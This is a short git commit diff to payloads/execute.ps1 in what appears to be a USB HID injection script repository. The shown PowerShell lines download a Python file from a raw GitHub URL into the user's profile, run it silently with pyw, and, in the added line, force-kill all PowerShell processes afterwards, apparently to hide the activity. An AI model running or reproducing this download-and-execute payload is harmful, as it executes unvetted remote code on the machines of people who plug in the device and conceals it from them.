6add36a9cbc1b8573c4911a15692658d94b60757
isaak vogel <isaak.vogel@student.htldornbirn.at>
2026-09-02 17:50:22 +0200

    kill powershell after execution

--- payloads/execute.ps1
+++ payloads/execute.ps1
@@ -21,3 +21,4 @@ else {
 
 curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output (Join-Path $env:USERPROFILE 'gdi1.py')
 pyw (Join-Path $env:USERPROFILE 'gdi1.py')
+taskkill /IM powershell.exe /F
